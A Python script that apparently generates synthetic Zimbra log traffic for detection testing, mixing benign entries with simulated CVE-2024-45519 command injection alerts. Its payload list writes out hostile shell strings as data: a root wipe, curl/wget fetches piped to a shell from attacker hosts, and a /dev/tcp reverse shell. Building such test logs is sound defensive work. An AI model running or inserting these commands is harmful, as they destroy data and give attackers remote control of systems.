#!/usr/bin/env python3
"""
Simulate Zimbra Application Traffic & Command Injection Exploit (CVE-2024-45519)
Generates realistic normal baseline logs and injects malicious swatchdog command strings.
"""

import sys
import time
import datetime
import random
import os

BENIGN_MESSAGES = [
    ("INFO", "SoapEngine", "handler invoked for Service Status"),
    ("INFO", "SoapEngine", "Authenticated user admin@corp.local from IP 192.168.1.50"),
    ("INFO", "MailboxSync", "Synchronized 14 unread messages for mailbox id=1024"),
    ("INFO", "SoapEngine", "GetFolderRequest processed for user jdoe@corp.local"),
    ("WARN", "snmp_notify", "localized notification sent successfully"),
    ("INFO", "PostjournalService", "Periodic health check OK"),
    ("INFO", "SoapEngine", "AuthRequest successful for user analyst@soc.corp"),
    ("INFO", "MailboxSync", "Incremental sync complete for 45 mailboxes")
]

MALICIOUS_PAYLOADS = [
    ("ALERT", "swatchdog", "execution payload: ; rm -rf /; wget http://malicious-attacker.com | sh;"),
    ("ALERT", "swatchdog", "execution payload: ; curl -s http://198.51.100.23/stage2.sh | bash;"),
    ("ALERT", "swatchdog", "execution payload: ; /bin/sh -i >& /dev/tcp/203.0.113.44/4444 0>&1;"),
    ("ALERT", "swatchdog", "execution payload: ; python -c 'import pty; pty.spawn(\"/bin/sh\")';")
]

def format_log(level, component, message, thread_id=None):
    now_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    t_id = thread_id if thread_id else f"http-bio-8443-exec-{random.randint(1, 15)}"
    return f"{now_str} {level:<5} [{t_id}] {component} - {message}\n"

def generate_static_sample(target_path):
    target_dir = os.path.dirname(os.path.abspath(target_path))
    if target_dir:
        os.makedirs(target_dir, exist_ok=True)
    with open(target_path, "w", encoding="utf-8") as f:
        f.write(format_log("INFO", "SoapEngine", "handler invoked for Service Status", "http-bio-8443-exec-1"))
        f.write(format_log("WARN", "snmp_notify", "localized notification sent successfully", "http-bio-8443-exec-4"))
        f.write(format_log("ALERT", "swatchdog", "execution payload: ; rm -rf /; wget http://malicious-attacker.com | sh;", "http-bio-8443-exec-9"))
    print(f"[+] Benchmark sample log generated at: {target_path}")

def live_stream(target_path, count=20, delay_sec=1.5):
    print(f"[*] Streaming {count} simulated logs to {target_path} (Interval: {delay_sec}s)...")
    target_dir = os.path.dirname(os.path.abspath(target_path))
    if target_dir:
        os.makedirs(target_dir, exist_ok=True)
    with open(target_path, "a", encoding="utf-8") as f:
        for i in range(1, count + 1):
            if i in [5, 12, 18]:
                level, comp, msg = random.choice(MALICIOUS_PAYLOADS)
                log_entry = format_log(level, comp, msg)
                print(f"[!] INJECTING MALICIOUS EXPLOIT PAYLOAD #{i}: {msg.strip()}")
            else:
                level, comp, msg = random.choice(BENIGN_MESSAGES)
                log_entry = format_log(level, comp, msg)
                print(f"[+] Benign log #{i}: {msg.strip()}")
            f.write(log_entry)
            f.flush()
            time.sleep(delay_sec)
    print("[*] Log streaming simulation complete.")

if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "static"
    output_file = sys.argv[2] if len(sys.argv) > 2 else "zimbra_traffic.log"
    
    if mode == "stream":
        live_stream(output_file)
    else:
        generate_static_sample(output_file)
